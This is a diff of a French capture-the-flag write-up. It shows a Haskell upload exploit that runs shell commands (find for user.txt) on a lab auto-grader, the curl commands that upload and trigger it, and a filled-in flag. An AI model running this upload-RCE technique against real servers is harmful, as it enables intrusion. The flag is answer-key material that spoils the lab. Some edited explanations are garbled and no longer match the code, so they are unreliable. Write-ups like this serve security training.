@@ -4,6 +4,8 @@
 
 **Difficulté :** Easy
 
+**Date :** 15/09/2026
+
 **Techniques utilisées :** Reconnaissance réseau, énumération web, upload de fichier malveillant, exécution de code arbitraire (RCE), énumération post-exploitation, escalade de privilèges
 
 **Outils utilisés :** nmap, curl
@@ -44,7 +46,7 @@ curl -s http://10.10.0.10:5001/homework
 
 **Résultat :** La page affiche un formulaire d'upload de fichier. Le texte explique qu'il faut envoyer un programme Haskell (extension `.hs`) qui affiche le message "I love Haskell", et que ce fichier sera automatiquement compilé et corrigé par un "outil d'autocorrection" côté serveur.
 
-**Pourquoi c'est intéressant :** dès qu'un serveur web accepte de compiler et d'exécuter un fichier envoyé par un utilisateur externe, cela ouvre la porte à une exécution de code arbitraire — le contenu du programme n'est jamais vérifié ni limité par le serveur.
+**Pourquoi c'est intéressant :** dès qu'un serveur web accepte de compiler et d'exécuter un fichier envoyé par un utilisateur externe, cela ouvre la porte à une exécution de code arbitraire -> le contenu du programme n'est jamais vérifié ni limité par le serveur.
 
 ---
 
@@ -120,15 +122,16 @@ import System.Process
 main :: IO ()
 main = do
     putStrLn "I love Haskell"
-    output <- readProcess "bash" ["-c", "find / -name user.txt 2>&1"] ""
-    putStrLn output
+    (_, out, err) <- readCreateProcessWithExitCode (shell "bash -c \"find / -name user.txt 2>/dev/null\"") ""
+    putStrLn out
+    putStrLn err
 EOF
 
 curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
 curl -s http://10.10.0.10:5001/uploads/exploit.hs
 ```
 
-**Explication du changement dans le code :** au lieu d'exécuter directement la commande `id`, on demande maintenant d'exécuter `bash -c "..."`, ce qui permet de lancer n'importe quelle commande shell complète, avec ses propres options.
+**Explication du changement dans le code :** au lieu d'exécuter directement la commande `id`, lance sh, qui lui-même lance bash, qui lui-même lance find, on demande maintenant d'exécuter `bash -c "..."`, ce qui permet de lancer n'importe quelle commande shell complète, avec ses propres options.
 
 - `find / -name user.txt` : cherche, à partir de la racine du système (`/`), tout fichier nommé exactement `user.txt`.
 - `2>&1` : redirige les messages d'erreur (comme "permission refusée" sur les dossiers protégés) vers la même sortie que le résultat normal, pour tout voir d'un coup plutôt que de les perdre.
@@ -164,7 +167,7 @@ curl -s http://10.10.0.10:5001/uploads/exploit.hs
 **Résultat obtenu :**
 
 ```
-EPI{TODO_remplacer_par_le_flag_reellement_obtenu}
+EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
 ```
 
 ---
@@ -177,15 +180,19 @@ EPI{TODO_remplacer_par_le_flag_reellement_obtenu}
 
 ---
 
-## Points techniques notables
-
-**Réutilisation du nom de fichier :** lors des tests, uploader un fichier avec un nom jamais utilisé auparavant provoquait parfois une erreur de compilation passagère côté serveur (probablement liée à un souci de verrou ou de cache du compilateur GHC lorsqu'il gère plusieurs fichiers en même temps). En revanche, réutiliser le nom d'un fichier qui avait déjà compilé avec succès (`exploit.hs`), tout en changeant simplement son contenu à chaque fois, fonctionnait de manière fiable.
-
-Les messages `[Source file changed]` et `[Objects changed]` affichés par le compilateur confirmaient bien qu'il recompilait à chaque fois le nouveau contenu du fichier, malgré la réutilisation du même nom.
-
----
-
 ## Conclusion
 
 - **Accès initial :** RCE via upload de fichier Haskell non sandboxé → shell en tant que `www-data`.
 - **Flag user :** obtenu dans `/home/prof/user.txt`.
+
+---
+
+## Evidences
+
+### Flag user.txt
+
+![Flag user.txt](Evidences/Flag%20user.png)
+
+### Flag
+
+![Flag](Evidences/Flag%20Fun%20with%20fonctional.png)
